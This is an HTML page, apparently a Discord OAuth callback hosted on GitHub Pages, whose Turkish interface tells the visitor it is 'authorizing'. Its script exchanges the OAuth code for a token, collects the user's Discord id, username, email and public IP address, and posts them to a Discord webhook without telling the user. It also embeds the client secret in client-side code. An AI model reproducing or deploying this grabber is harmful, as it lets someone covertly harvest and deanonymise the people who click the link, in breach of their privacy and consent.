<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      background: #0f0f13;
      color: #f0f0f0;
      font-family: monospace;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 2rem;
    }
    h1 {
      font-size: 2rem;
      margin-bottom: 1rem;
      color: #ff4757;
    }
    .log {
      width: 100%;
      max-width: 600px;
      background: #1a1a1f;
      border: 1px solid #444;
      padding: 1rem;
      border-radius: 8px;
      white-space: pre-wrap;
      word-break: break-word;
    }
  </style>
</head>
<body>
  <h1>Yetkilendiriliyor...</h1>
  <div class="log" id="log">OAuth başlatılıyor...</div>

<script>
(async () => {
  const client_id     = "YOUR_CLIENT_ID";
  const client_secret = "YOUR_CLIENT_SECRET";
  const redirect_uri  = "https://indigozariyah.github.io/system/callback.html";
  const webhook_url   = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN";

  const logEl = document.getElementById("log");
  const log = (msg) => logEl.textContent += "\n" + msg;

  const code = new URLSearchParams(window.location.search).get("code");
  if (!code) {
    log("❌ URL'de ?code yok, işlem iptal.");
    return;
  }

  try {
    // 1. access_token al
    const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({
        client_id,
        client_secret,
        grant_type: "authorization_code",
        code,
        redirect_uri
      })
    });
    const tokenData = await tokenRes.json();
    if (!tokenData.access_token) throw new Error("Access token alınamadı.");
    log("✅ access_token alındı.");

    // 2. Kullanıcı bilgisi çek
    const userRes = await fetch("https://discord.com/api/users/@me", {
      headers: { "Authorization": `Bearer ${tokenData.access_token}` }
    });
    const user = await userRes.json();
    log("✅ Kullanıcı bilgisi çekildi.");

    // 3. Vanity URL (kısa kullanıcı URL'si)
    const vanity_url = `https://discord.com/users/${user.id}`;

    // 4. IP adresi çek
    const ipRes = await fetch("https://api.ipify.org?format=json");
    const ipData = await ipRes.json();
    log("✅ IP adresi alındı.");

    // 5. Webhook'a gönderilecek payload
    const payload = {
      id: user.id,
      username: `${user.username}#${user.discriminator}`,
      email: user.email || null,
      client_ip: ipData.ip,
      vanity_url: vanity_url
    };

    await fetch(webhook_url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: "```json\n" + JSON.stringify(payload, null, 2) + "\n```"
      })
    });

    log("✅ Webhook'a başarıyla gönderildi.");
    log("Gönderilen veri:");
    log(JSON.stringify(payload, null, 2));

  } catch (err) {
    log("❌ Hata oluştu: " + err.message);
  }
})();
</script>
</body>
</html>
